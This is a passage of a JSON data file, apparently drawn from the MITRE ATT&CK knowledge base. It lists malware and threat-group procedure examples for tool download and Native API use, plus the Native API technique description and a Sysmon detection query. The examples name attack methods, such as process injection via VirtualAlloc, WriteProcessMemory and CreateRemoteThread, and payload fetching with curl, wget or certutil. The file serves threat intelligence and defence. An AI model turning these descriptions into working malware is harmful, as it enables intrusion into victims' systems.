      "Psylohas a command to download a file to the system from its C2 server.[108]",
      "Pteranodoncan download and execute additional files.[219][415][416]",
      "PUNCHBUGGYcan download additional files and payloads to compromised hosts.[417][418]",
      "Pupycan upload and download to/from a victim machine.[419]",
      "QakBothas the ability to download additional components and malware.[420][421][422][423][424][425]",
      "QuasarRATcan download files to the victim’s machine and execute them.[426][427]",
      "QuietSievecan download and execute payloads on a target host.[222]",
      "Raccoon Stealerdownloads various library files enabling interaction with various data stores and structures to facilitate follow-on information theft.[428][429]",
      "RainyDaycan download files to a compromised host.[359]",
      "Rancorhas downloaded additional malware, including by usingcertutil.[166]",
      "RARSTONEdownloads its backdoor component from a C2 server and loads it directly into memory.[430]",
      "Raspberry Robinretrieves its second stage payload in a variety of ways such as through msiexec.exe abuse, or running the curl command to download the payload to the victim's%AppData%folder.[431][432]",
      "RATANKBAuploads and downloads information.[433][434]",
      "RCSessionhas the ability to drop additional files to an infected machine.[435]",
      "RDATcan download files via DNS.[436]",
      "RedLeavesis capable of downloading a file from a specified URL.[437]",
      "RegDukecan download files from C2.[307]",
      "reGeorghas the ability to download files to targeted systems.[360]",
      "Remcoscan upload and download files to and from the victim’s machine.[438]",
      "RemoteCMDcopies a file over to the remote system before execution.[439]",
      "RemoteUtilitiescan upload and download files to and from a target machine.[353]",
      "Remseccontains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.[440][441]",
      "Revenge RAThas the ability to upload and download files.[442]",
      "REvilcan download a copy of itself from an attacker controlled IP address to the victim machine.[443][444][445]",
      "RGDooruploads and downloads files to and from the victim’s machine.[446]",
      "Rockeused malware to download additional malicious files to the target system.[447]",
      "RogueRobincan save a new file to the system from the C2 server.[448][449]",
      "ROKRATcan retrieve additional malicious payloads from its C2 server.[450][451][36][452]",
      "RTMcan download additional files.[453][454]",
      "S-Typecan download additional files onto a compromised host.[340]",
      "Saint Botcan download additional files onto a compromised host.[393]",
      "Sakulahas the capability to download files.[455]",
      "SampleCheck5000can download additional payloads to compromised hosts.[392][373]",
      "Samuraihas been used to deploy other malware includingNinja.[129]",
      "Sandworm Teamhas pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.[456][457]",
      "Sardonichas the ability to upload additional malicious files to a compromised machine.[458]",
      "SDBbothas the ability to download a DLL from C2 to a compromised host.[459]",
      "SeaDukeis capable of uploading and downloading files.[460]",
      "Seasalthas a command to download additional files.[75][75]",
      "SEASHARPEEcan download remote files onto victims.[461]",
      "ServHelpermay download additional files to execute.[462][463]",
      "Seth-Lockerhas the ability to download and execute files on a compromised host.[464]",
      "ShadowPadhas downloaded code from a C2 server.[465]",
      "DuringShadowRay, threat actors downloaded and executed the XMRig miner on targeted hosts.[466]",
      "Shamooncan download an executable to run on the victim.[467]",
      "Sharkcan download additional files from its C2 via HTTP or DNS.[338][468]",
      "SharpDiscohas been used to download a Python interpreter toC:\\Users\\Public\\WinTN\\WinTN.exeas well as other plugins from external sources.[171]",
      "SharpStagehas the ability to download and execute additional payloads via a DropBox API.[179][180]",
      "SHARPSTATShas the ability to upload and download files.[469]",
      "ShimRatcan download additional files.[470]",
      "ShimRatReporterhad the ability to download additional payloads.[470]",
      "SHUTTERSPEEDcan download and execute an arbitary executable.[33]",
      "Sibotcan download and execute a payload onto a compromised system.[230]",
      "SideCopyhas delivered trojanized executables via spearphishing emails that contacts actor-controlled servers to download malicious payloads.[8]",
      "SideTwisthas the ability to download additional files.[471]",
      "Sidewinderhas used LNK files to download remote files to the victim's network.[472][473]",
      "Silencehas downloaded additional modules and malware to victim’s machines.[474]",
      "SILENTTRINITYcan load additional files and tools, includingMimikatz.[475]",
      "Skidmaphas the ability to download files on an infected host.[476]",
      "RAPIDPULSEcan transfer files to and from compromised hosts.[477]",
      "Slivercan download additional content and files from theSliverserver to the client residing on the victim machine using theuploadcommand.[478][479]",
      "SLOTHFULMEDIAhas downloaded files onto a victim machine.[480]",
      "SLOWDRIFTdownloads additional payloads.[33]",
      "Small Sievehas the ability to download files.[481]",
      "Smoke Loaderdownloads a new version of itself once it has installed. It also downloads additional plugins.[482]",
      "SMOKEDHAMhas used Powershell to download UltraVNC andngrokfrom third-party file sharing sites.[483]",
      "Snip3can download additional payloads to compromised systems.[484][485]",
      "SocGholishcan download additional malware to infected hosts.[486][487]",
      "SodaMasterhas the ability to download additional payloads from C2 to the targeted system.[185]",
      "Solarhas the ability to download and execute files.[392]",
      "During theSolarWinds Compromise,APT29downloaded additional malware, such asTEARDROPandCobalt Strike, onto a compromised host following initial access.[488]",
      "SombRAThas the ability to download and execute additional payloads.[144][167][489]",
      "SoreFangcan download additional payloads from C2.[490][491]",
      "SpeakUpdownloads and executes additional files from a remote server.[492]",
      "Spicacan upload and download files to and from compromised hosts.[493]",
      "SpicyOmelettecan download malicious files from threat actor controlled AWS URL's.[494]",
      "SQLRatcan make a direct SQL connection to a Microsoft database controlled by the attackers, retrieve an item from the bindata table, then write and execute the file on disk.[495]",
      "Squirrelwafflehas downloaded and executed additional encoded payloads.[496][497]",
      "STEADYPULSEcan add lines to a Perl script on a targeted server to import additional Perl modules.[498]",
      "StoneDrillhas downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine.[499]",
      "Storm-1811has used scriptedcURLcommands,BITSAdmin, and other mechanisms to retrieve follow-on batch scripts and tools for execution on victim devices.[500][501][502]",
      "StrelaStealerinstallers have used obfuscated PowerShell scripts to retrieve follow-on payloads from WebDAV servers.[503]",
      "StrifeWatercan download updates and auxiliary modules.[504]",
      "StrongPitycan download files to specified targets.[505]",
      "SUNBURSTdelivered different payloads, includingTEARDROPin at least one instance.[488]",
      "SVCReadyhas the ability to download additional tools such as the RedLine Stealer to an infected host.[506]",
      "SysUpdatehas the ability to download files to a compromised host.[394][507]",
      "TA2541has used malicious scripts and macros with the ability to download additional payloads.[508]",
      "TA505has downloaded additional malware to execute on victim systems.[509][463][510]",
      "TA551has retrieved DLLs and installer binaries for malware execution from C2.[511]",
      "Taidoorhas downloaded additional files onto a compromised host.[512]",
      "TAINTEDSCRIBEcan download additional modules from its C2 server.[513]",
      "TAMECAThas usedwgetandcurlto download additional content.[364]",
      "TDTESShas a command to download and execute an additional file.[514]",
      "TeamTNThas thecurlandwgetcommands as well as batch scripts to download new tools.[515][516]",
      "ThiefQuestcan download and execute payloads in-memory or from disk.[517]",
      "Threat Group-3390has downloaded additional malware and tools, including through the use ofcertutil, onto a compromised host .[252][518]",
      "ThreatNeedlecan download additional tools to enable lateral movement.[298]",
      "TinyTurlahas the ability to act as a second-stage dropper used to infect the system with additional malware.[519]",
      "Tomiriscan download files and execute them on a victim's system.[520]",
      "Tonto Teamhas downloaded malicious DLLs which served as aShadowPadloader.[521]",
      "TrickBotdownloads several additional files and saves them to the victim's machine.[522][523]",
      "Trojan.Karaganycan upload, download, and execute files on the victim.[524][525]",
      "Tropic Trooperhas used a delivered trojan to download additional files.[526]",
      "TSCookiehas the ability to upload and download files to and from the infected host.[527]",
      "Turiancan download additional files and tools from its C2.[61]",
      "Turlahas used shellcode to download Meterpreter after compromising a victim.[528]",
      "TURNEDUPis capable of downloading additional files.[529]",
      "TYPEFRAMEcan upload and download files to the victim’s machine.[530]",
      "UBoatRATcan upload and download files to the victim’s machine.[531]",
      "Unknown Loggeris capable of downloading remote files.[64]",
      "UPPERCUTcan download and upload files to and from the victim’s machine.[532]",
      "Uroburoscan use aPutcommand to write files to an infected machine.[533]",
      "Ursnifhas dropped payload and configuration files to disk.Ursnifhas also been used to download and execute additional payloads.[534][535]",
      "Valakhas downloaded a variety of modules and payloads to the compromised host, includingIcedIDand NetSupport Manager RAT-based malware.[536][537]",
      "VaporRagehas the ability to download malicious shellcode to compromised systems.[87]",
      "Vasportcan download files.[538]",
      "VBShowerhas the ability to download VBS files to the target computer.[539]",
      "VERMINcan download and upload files to the victim's machine.[540]",
      "Volatile Cedarcan deploy additional tools.[115]",
      "Volgmercan download remote files and additional payloads to the victim's machine.[541][542][543]",
      "Volt Typhoonhas downloaded an outdated version of comsvcs.dll to a compromised domain controller in a non-standard folder.[544]",
      "WarzoneRATcan download and execute additional files.[545]",
      "Water Curupira Pikabot Distributionused Curl.exe to download thePikabotpayload from an external server, saving the file to the victim machine's temporary directory.[546]",
      "Waterbearcan receive and load executables from remote C2 servers.[547]",
      "WEBC2can download and execute a file.[548]",
      "WellMailcan receive data and executable scripts from C2.[549]",
      "WellMesscan write files to a compromised host.[26][550]",
      "WhisperGatecan download additional stages of malware from a Discord CDN channel.[551][552][553][554]",
      "Whiteflyhas the ability to download additional tools from the C2.[555]",
      "Wiarpcreates a backdoor through which remote attackers can download files.[556]",
      "Windshifthas used tools to deploy additional payloads to compromised hosts.[557]",
      "Winnti for Linuxhas the ability to deploy modules directly from command and control (C2) servers, possibly for remote command execution, file exfiltration, and socks5 proxying on the infected host.[558]",
      "TheWinnti for Windowsdropper can place malicious payloads on targeted systems.[559]",
      "Winnti Grouphas downloaded an auxiliary program named ff.exe to infected machines.[560]",
      "Winter Vivernexecuted PowerShell scripts to create scheduled tasks to retrieve remotely-hosted payloads.[561]",
      "WIREFIREhas the ability to download files to compromised devices.[562]",
      "WIRTEhas downloaded PowerShell code from the C2 server to be executed.[563]",
      "Wizard Spidercan transfer malicious payloads such as ransomware to compromised machines.[564]",
      "Woody RATcan download files from its C2 server, including the .NET DLLs,WoodySharpExecutorandWoodyPowerSession.[565]",
      "Xbashcan download additional malicious files from its C2 server.[566]",
      "xCaonhas a command to download files to the victim's machine.[88]",
      "XCSSETdownloads browser specific AppleScript modules using a constructed URL with thecurlcommand,https://\" & domain & \"/agent/scripts/\" & moduleName & \".applescript.[567]",
      "YAHOYAHuses HTTP GET requests to download other files that are executed in memory.[568]",
      "Zebrocyobtains additional code to execute on the victim's machine, including the downloading of a secondary payload.[569][109][570][22]",
      "ZeroTcan download additional payloads onto the victim.[571]",
      "Zeus Pandacan download additional malware plug-in modules and execute them on the victim’s machine.[572]",
      "ZIPLINEcan download files to be saved on the compromised system.[562][97]",
      "ZIRCONIUMhas used tools to download malicious files to compromised hosts.[573]",
      "ZLibhas the ability to download files.[340]",
      "Zoxcan download files to a compromised machine.[247]",
      "ZxShellhas a command to transfer files from a remote host.[574]",
      "ZxxZcan download and execute additional files.[80]"
    ]
  },
  "T1106": {
    "Name": "Native API",
    "Description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.[1][2]These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.Adversaries may abuse these OS API functions as a means of executing behaviors. Similar toCommand and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.Native API functions (such asNtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.[3][4][5]For example, functions such as the Windows APICreateProcess()or GNUfork()will allow programs and scripts to start other processes.[6][7]This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.[8][9][10]Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.[11][12][13][14]Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.[15]Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions viaDisable or Modify Tools.",
    "Detects": [
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Utilization of the Windows APIs may involve processes loading/accessing system DLLs associated with providing called functions (ex: ntdll.dll, kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity.Analytic 1 - Look for unusual or abnormal DLL loads, processes loading DLLs not typically associated with themsourcetype=Sysmon EventCode=7| stats count by module_name process_name user| where module_name IN (\"ntdll.dll\", \"kernel32.dll\", \"advapi32.dll\", \"user32.dll\", \"gdi32.dll\")",
      "Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and may be difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient."
    ],
    "Procedure Examples": [
      "ADVSTORESHELLis capable of starting a process using CreateProcess.[16]",
      "Akiraexecutes native Windows functions such asGetFileAttributesWandGetSystemInfo.[17]",
      "Amadeyhas used a variety of Windows API calls, includingGetComputerNameA,GetUserNameA, andCreateProcessA.[18]",
      "AppleSeedhas the ability to use multiple dynamically resolved API calls.[19]",
      "APT37leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.[20]",
      "APT38has used the Windows API to execute code within a victim's system.[21]",
      "Aria-bodyhas the ability to launch files usingShellExecute.[22]",
      "AsyncRAThas the ability to use OS APIs includingCheckRemoteDebuggerPresent.[23]",
      "Attor's dispatcher has used CreateProcessW API for execution.[24]",
      "Avaddonhas used the Windows Crypto API to generate an AES key.[25]",
      "AvosLockerhas used a variety of Windows API calls, includingNtCurrentPebandGetLogicalDrives.[26]",
      "Babukcan use multiple Windows API calls for actions on compromised hosts including discovery and execution.[27][28][29]",
      "BackConfigcan leverage API functions such asShellExecuteAandHttpOpenRequestAin the process of downloading and executing files.[30]",
      "Bad Rabbithas used various Windows API calls.[31]",
      "BADHATCHcan utilize Native API functions such as,ToolHelp32andRt1AdjustPrivilegeto enableSeDebugPrivilegeon a compromised machine.[32]",
      "BADNEWShas a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.[33][34]",
      "Bandookhas used the ShellExecuteW() function call.[35]",
      "Bankshotcreates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().[36]",
      "Bazarcan use various APIs to allocate memory and facilitate code execution/injection.[37]",
      "BBKhas the ability to use theCreatePipeAPI to add a sub-process for execution viacmd.[38]",
      "BendyBearcan load and execute modules and Windows Application Programming (API) calls using standard shellcode API hashing.[39]",
      "Bisonalhas used the Windows API to communicate with the Service Control Manager to execute a thread.[40]",
      "BitPaymerhas used dynamic API resolution to avoid identifiable strings within the binary, includingRegEnumKeyW.[41]",
      "Black Bastahas the ability to use native APIs for numerous functions including discovery and defense evasion.[42][43][44][45][46]",
      "BlackByte Ransomwareuses theSetThreadExecutionStateAPI to prevent the victim system from entering sleep.[47]",
      "BlackTechhas used built-in API functions.[48]",
      "BloodHoundcan use .NET API calls in the SharpHound ingestor component to pull Active Directory data.[49]",
      "BoxCaonhas used Windows API calls to obtain information about the compromised host.[50]",
      "Brute Ratel C4can call multiple Windows APIs for execution, to share memory, and defense evasion.[51][52]",
      "build_downerhas the ability to use theWinExecAPI to execute malware on a compromised host.[38]",
      "Bumblebeecan use multiple Native APIs.[53][54]",
      "CaddyWiperhas the ability to dynamically resolve and use APIs, includingSeTakeOwnershipPrivilege.[55]",
      "Carberphas used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories.[56]",
      "Chaesused theCreateFileW()API function with read permissions to access downloaded payloads.[57]",
      "Chimerahas used direct Windows system calls by leveraging Dumpert.[58]",
      "CHIMNEYSWEEPcan use Windows APIs includingLoadLibraryandGetProcAddress.[59]",
      "Chrommmecan use Windows API includingWinExecfor execution.[60]",
      "Clophas used built-in API functions such as WNetOpenEnumW(), WNetEnumResourceW(), WNetCloseEnum(), GetProcAddress(), and VirtualAlloc().[61][62]",
      "Cobalt Strike's Beacon payload is capable of running shell commands withoutcmd.exeand PowerShell commands withoutpowershell.exe[63][64][65]",
      "ComRATcan load a PE file from memory or the file system and execute it withCreateProcessW.[66]",
      "Contihas used API calls during execution.[67][68]",
      "CostaBrickshas used a number of API calls, includingVirtualAlloc,VirtualFree,LoadLibraryA,GetProcAddress, andExitProcess.[69]",
      "Cubahas used several built-in API functions for discovery like GetIpNetTable and NetShareEnum.[70]",
      "Cyclops Blinkcan use various Linux API functions including those for execution and discovery.[71]",
      "DarkGateuses the native Windows APICallWindowProc()to decode and launch encoded shellcode payloads during execution.[72]DarkGatecan call kernel mode functions directly to hide the use of process hollowing methods during execution.[73]DarkGatehas also used theCreateToolhelp32Snapshot,GetFileAttributesAandCreateProcessAfunctions to obtain a list of running processes, to check for security products and to execute its malware.[74]",
      "DarkTortillacan use a variety of API calls for persistence and defense evasion.[75]",
      "DCSrvhas used various Windows API functions, includingDeviceIoControl, as part of its encryption process.[76]",
      "DEADEYEcan execute theGetComputerNameAandGetComputerNameExAWinAPI functions.[77]",
      "Denisused theIsDebuggerPresent,OutputDebugString, andSetLastErrorAPIs to avoid debugging.DenisusedGetProcAddressandLoadLibraryto dynamically resolve APIs.Denisalso used theWow64SetThreadContextAPI as part of a process hollowing process.[78]",
      "Diavolhas used several API calls likeGetLogicalDriveStrings,SleepEx,SystemParametersInfoAPI,CryptEncrypt, and others to execute parts of its attack.[79]",
      "Donutcode modules use various API functions to load and inject code.[80]",
      "DRATzaruscan use various API calls to see if it is running in a sandbox.[81]",
      "Dridexhas used theOutputDebugStringWfunction to avoid malware analysis as part of its anti-debugging technique.[82]",
      "Egregorhas used the Windows API to make detection more difficult.[83]",
      "Emotethas usedCreateProcessto create a new process to run its executable andWNetEnumResourceWto enumerate non-hidden shares.[84]",
      "Empirecontains a variety of enumeration modules that have an option to use API calls to carry out tasks.[85]",
      "EvilBunnyhas used various API calls as part of its checks to see if the malware is running in a sandbox.[86]",
      "ExbytecallsShellExecuteWwith theIpOperationparameterRunAsto launchexplorer.exewith elevated privileges.[87]",
      "Explosivehas a function to call the OpenClipboard wrapper.[88]",
      "FatDukecan callShellExecuteWto open the default browser on the URL localhost.[89]",
      "Flagprocan use Native API to enable obfuscation includingGetLastErrorandGetTickCount.[90]",
      "FoggyWeb's loader can use API functions to load theFoggyWebbackdoor into the same Application Domain within which the legitimate AD FS managed code is executed.[91]",
      "FunnyDreamcan use Native API for defense evasion, discovery, and collection.[92]",
      "Gamaredon Groupmalware has usedCreateProcessto launch additional malicious components.[93]",
      "Gelsemiumhas the ability to use various Windows API functions to perform tasks.[60]",
      "gh0st RAThas used theInterlockedExchange,SeShutdownPrivilege, andExitWindowsExWindows API functions.[94]",
      "GoldenSpycan execute remote commands in the Windows command shell using theWinExec()API.[95]",
      "Goopyhas the ability to  enumerate the infected system's user name viaGetUserNameW.[78]",
      "Gorgon Groupmalware can leverage the Windows API call, CreateProcessA(), for execution.[96]",
      "Grandoreirocan execute through theWinExecAPI.[97]",
      "GrimAgentcan use Native API includingGetProcAddressandShellExecuteW.[98]",
      "GuLoadercan use a number of different APIs for discovery and execution.[99]",
      "Hancitorhas usedCallWindowProcandEnumResourceTypesAto interpret and execute shellcode.[100]",
      "HAWKBALLhas leveraged several Windows API calls to create processes, gather disk information, and detect debugger activity.[101]",
      "HermeticWipercan call multiple Windows API functions used for privilege escalation, service execution, and to overwrite random bites of data.[102][103][104][105]",
      "HermeticWizardcan connect to remote shares usingWNetAddConnection2W.[104]",
      "Higaisahas called various native OS APIs.[106]",
      "HotCroissantcan perform dynamic DLL importing and API lookups usingLoadLibraryandGetProcAddresson obfuscated strings.[107]",
      "HyperBrohas the ability to run an application (CreateProcessW) or script/file (ShellExecuteW) via API.[108]",
      "HyperStackcan use Windows API'sConnectNamedPipeandWNetAddConnection2to detect incoming connections and connect to remote shares.[109]",
      "IcedIDhas calledZwWriteVirtualMemory,ZwProtectVirtualMemory,ZwQueueApcThread, andNtResumeThreadto inject itself into a remote process.[110]",
      "IMAPLoaderimports native Windows APIs such asGetConsoleWindowandShowWindow.[111]",
      "Imminent Monitorhas leveraged CreateProcessW() call to execute the debugger.[112]",
      "INC Ransomwarecan use the APIDeviceIoControlto resize the allocated space for and cause the deletion of volume shadow copy snapshots.[113]",
      "InnaputRATuses the API call ShellExecuteW for execution.[114]",
      "InvisiMolecan use winapiexec tool for indirect execution ofShellExecuteWandCreateProcessA.[115]",
      "Kapekautilizes WinAPI calls to gather victim system information.[116]",
      "Kevincan use theShowWindowAPI to avoid detection.[117]",
      "KillDiskhas called the Windows API to retrieve the hard disk handle and shut down the machine.[118]",
      "KOCTOPUScan use theLoadResourceandCreateProcessWAPIs for execution.[119]",
      "KONNIhas hardcoded API calls within its functions to use on the victim's machine.[120]",
      "Latrodectushas used multiple Windows API post exploitation includingGetAdaptersInfo,CreateToolhelp32Snapshot, andCreateProcessW.[121][122]",
      "Lazarus Grouphas used the Windows APIObtainUserAgentStringto obtain the User-Agent from a compromised host to connect to a C2 server.[123]Lazarus Grouphas also used various, often lesser known, functions to perform various types of Discovery andProcess Injection.[124][125]",
      "LightNeuronis capable of starting a process using CreateProcess.[126]",
      "LitePowercan use various API calls.[127]",
      "Lizarhas used various Windows API functions on a victim's machine.[128]",
      "LockBit 3.0has the ability to directly call native Windows API items during execution.[129][130]",
      "Lokibothas used LoadLibrary(), GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode.[131]",
      "MacMahas used macOS API functions to perform tasks.[132][133]",
      "Mafaldacan use a variety of API calls.[134]",
      "Mangohas the ability to use Native APIs.[135]",
      "MarkiRATcan run the ShellExecuteW API via the Windows Command Shell.[136]",
      "Mazehas used several Windows API functions throughout the encryption process including IsDebuggerPresent, TerminateProcess, Process32FirstW, among others.[137]",
      "After escalating privileges,MegaCortexcallsTerminateProcess(),CreateRemoteThread, and other Win32 APIs.[138]",
      "menuPasshas used native APIs includingGetModuleFileName,lstrcat,CreateFile, andReadFile.[139]",
      "metaMaincan execute an operator-provided Windows command by leveraging functions such asWinExec,WriteFile, andReadFile.[134][140]",
      "Metamorfohas used native WINAPI calls.[141][142]",
      "Meteorcan useWinAPIto remove a victim machine from an Active Directory domain.[143]",
      "Milancan use the APIDnsQuery_Afor DNS resolution.[117]",
      "Mis-Typehas used Windows API calls, includingNetUserAddandNetUserDel.[144]",
      "Misdathas used Windows APIs, includingExitWindowsExandGetKeyboardType.[144]",
      "Mispaduhas used a variety of Windows API calls, including ShellExecute and WriteProcessMemory.[145][146]",
      "Mosquitoleverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.[147]",
      "Nebulaehas the ability to useCreateProcessto execute a process.[148]",
      "Netwalkercan use Windows API functions to inject the ransomware DLL.[149]",
      "NETWIREcan use Native API includingCreateProcessGetProcessById, andWriteProcessMemory.[150]",
      "NightClubcan use multiple native APIs includingGetKeyState,GetForegroundWindow,GetWindowThreadProcessId, andGetKeyboardLayout.[151]",
      "TheNinjaloader can call Windows APIs for discovery, process injection, and payload decryption.[152][153]",
      "njRAThas used the ShellExecute() function within a script.[154]",
      "ODAgentcan pass commands using native APIs.[155]",
      "OilBoosterhas used theShowWindowandCreateProcessWAPIs.[155]",
      "DuringOperation Dream Job,Lazarus Groupused Windows APIObtainUserAgentStringto obtain the victim's User-Agent and used the value to connect to their C2 server.[123]",
      "DuringOperation Honeybee, the threat actors deployed malware that used API calls, includingCreateProcessAsUser.[156]",
      "DuringOperation Sharpshooter, the first stage downloader resolved various Windows libraries and APIs, includingLoadLibraryA(),GetProcAddress(), andCreateProcessA().[157]",
      "DuringOperation Wocao, threat actors used theCreateProcessAandShellExecuteAPI functions to launch commands after being injected into a selected process.[158]",
      "PcSharehas used a variety of Windows API functions.[92]",
      "Pikabotuses native Windows APIs to determine if the process is being debugged and analyzed, such asCheckRemoteDebuggerPresent,NtQueryInformationProcess,ProcessDebugPort, andProcessDebugFlags.[159]OtherPikabotvariants populate a global list of Windows API addresses from theNTDLLandKERNEL32libraries, and references these items instead of calling the API items to obfuscate execution.[160]",
      "Pillowminthas used multiple native Windows APIs to execute and conduct process injections.[161]",
      "PipeMon's first stage has been executed by a call toCreateProcesswith the decryption password in an argument.PipeMonhas used a call toLoadLibraryto load its installer.[162]",
      "PLEADcan useShellExecuteto execute applications.[163]",
      "PlugXcan use the Windows API functionsGetProcAddress,LoadLibrary, andCreateProcessto execute another process.[164][165]",
      "PolyglotDukecan useLoadLibraryWandCreateProcessto load and execute code.[89]",
      "Ponyhas used several Windows functions for various purposes.[166]",
      "Prestigehas used theWow64DisableWow64FsRedirection()andWow64RevertWow64FsRedirection()functions to disable and restore file system redirection.[167]",
      "Pteranodonhas used various API calls.[168]",
      "QakBotcan useGetProcAddressto help delete malicious strings from memory.[169]",
      "QUIETCANARYcan callSystem.Net.HttpWebRequestto identify the default proxy configured on the victim computer.[170]",
      "The file collection tool used byRainyDaycan utilize native API includingReadDirectoryChangeWfor folder monitoring.[148]",
      "Ramsaycan use Windows API functions such asWriteFile,CloseHandle, andGetCurrentHwProfileduring its collection and file storage operations.Ramsaycan execute its embedded components viaCreateProcessAandShellExecute.[171]",
      "RCSessioncan use WinSock API for communication includingWSASendandWSARecv.[172]",
      "RDFSNIFFERhas used several Win32 API functions to interact with the victim machine.[173]",
      "REvilcan use Native API for execution and to retrieve active services.[174][175]",
      "Rising Sunused dynamic API resolutions to various Windows APIs by leveragingLoadLibrary()andGetProcAddress().[157]",
      "ROKRATcan use a variety of API calls to execute shellcode.[176]",
      "When executing with non-root permissions,RotaJakirouses the theshmgetAPI to create shared memory between other knownRotaJakiroprocesses.RotaJakiroalso uses theexecvpAPI to help its dead process \"resurrect\".[177]",
      "Royalcan use multiple APIs for discovery, communication, and execution.[178]",
      "RTMcan use theFindNextUrlCacheEntryAandFindFirstUrlCacheEntryAfunctions to search for specific strings within browser history.[179]",
      "Ryukhas used multiple native APIs includingShellExecuteWto run executables,GetWindowsDirectoryWto create folders, andVirtualAlloc,WriteProcessMemory, andCreateRemoteThreadfor process injection.[180]",
      "S-Typehas used Windows APIs, includingGetKeyboardType,NetUserAdd, andNetUserDel.[144]",
      "Sagerunexcalls theWaitForSingleObjectAPI function as part of time-check logic.[181]",
      "Saint Bothas used different API calls, includingGetProcAddress,VirtualAllocEx,WriteProcessMemory,CreateProcessA, andSetThreadContext.[182][183]",
      "Samuraihas the ability to call Windows APIs.[152]",
      "Sandworm TeamusesPrestigeto disable and restore file system redirection by using the following functions:Wow64DisableWow64FsRedirection()andWow64RevertWow64FsRedirection().[167]",
      "Sardonichas the ability to call Win32 API functions to determine ifpowershell.exeis running.[184]",
      "SharpDiscocan leverage Native APIs through plugins includingGetLogicalDrives.[151]",
      "ShimRathas used Windows API functions to install the service and shim.[185]",
      "ShimRatReporterused several Windows API functions to gather information from the infected system.[185]",
      "SideCopyhas executed malware by calling the API functionCreateProcessW.[186]",
      "SideTwistcan useGetUserNameW,GetComputerNameW, andGetComputerNameExWto gather information.[187]",
      "Silencehas leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks.[188][189]",
      "SILENTTRINITYhas the ability to leverage API includingGetProcAddressandLoadLibrary.[190]",
      "Siloscapemakes various native API calls.[191]",
      "SodaMastercan useRegOpenKeyWto access the Registry.[192]",
      "SombRAThas the ability to respawn itself usingShellExecuteWandCreateProcessW.[69]",
      "StealBitcan use native APIs includingLoadLibraryExAfor execution andNtSetInformationProcessfor defense evasion purposes.[193]",
      "StrifeWatercan use a variety of APIs for execution.[194]",
      "Stuxnetuses the SetSecurityDescriptorDacl API to reduce object integrity levels.[195]",
      "SUNSPOTused Windows API functions such asMoveFileExandNtQueryInformationProcessas part of theSUNBURSTinjection process.[196]",
      "SVCReadycan use Windows API calls to gather information from an infected host.[197]",
      "SynAckparses the export tables of system DLLs to locate and call various Windows API functions.[198][199]",
      "SysUpdatecan call theGetNetworkParamsAPI as part of its C2 establishment process.[200]",
      "TA505has deployed payloads that use Windows API calls on a compromised host.[201]",
      "Taidoorhas the ability to use native APIs for execution includingGetProcessHeap,GetProcAddress, andLoadLibrary.[202][203]",
      "ThiefQuestuses various API to perform behaviors such as executing payloads and performing local enumeration.[204]",
      "TinyTurlahas usedWinHTTP,CreateProcess, and other APIs for C2 communications and other functions.[205]",
      "ToddyCathas usedWinExecto execute commands received from C2 on compromised hosts.[153]",
      "Torismahas used various Windows API calls.[206]",
      "TrickBotuses the Windows API call, CreateProcessW(), to manage execution flow.[207]TrickBothas also usedNt*API functions to performProcess Injection.[208]",
      "Tropic Trooperhas used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl.[209]",
      "Turlaand its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.[210]",
      "Uroburoscan use native Windows APIs includingGetHostByName.[211]",
      "Ursnifhas usedCreateProcessWto create child processes.[212]",
      "Volgmerexecutes payloads using the Windows API call CreateProcessW().[213]",
      "WarzoneRATcan use a variety of API calls on a compromised host.[214]",
      "WastedLocker's custom crypter, CryptOne, leveraged the VirtualAlloc() API function to help execute the payload.[215]",
      "Waterbearcan leverage API functions for execution.[216]",
      "WhisperGatehas used theExitWindowsExto flush file buffers to disk and stop running processes and other API calls.[217][218]",
      "WindTailcan invoke Apple APIscontentsOfDirectoryAtPath,pathExtension, and (string)compare.[219]",
      "Winnti for Windowscan use Native API to create a new process and to start services.[220]",
      "Woody RATcan use multiple native APIs, includingWriteProcessMemory,CreateProcess, andCreateRemoteThreadfor process injection.[221]",
      "XAgentOSXcontains the execFile function to execute a specified file on the system using the NSTask:launch method.[222]",
      "xCaonhas leveraged native OS function calls to retrieve  victim's network adapter's  information using GetAdapterInfo() API.[50]",
      "XLoaderuses the native Windows API for functionality, including defense evasion.[223]",
      "ZeroClearecan call theGetSystemDirectoryWAPI to locate the system directory.[59]",
      "ZxShellcan leverage native API includingRegisterServiceCtrlHandlerto register a service.RegisterServiceCtrlHandler",
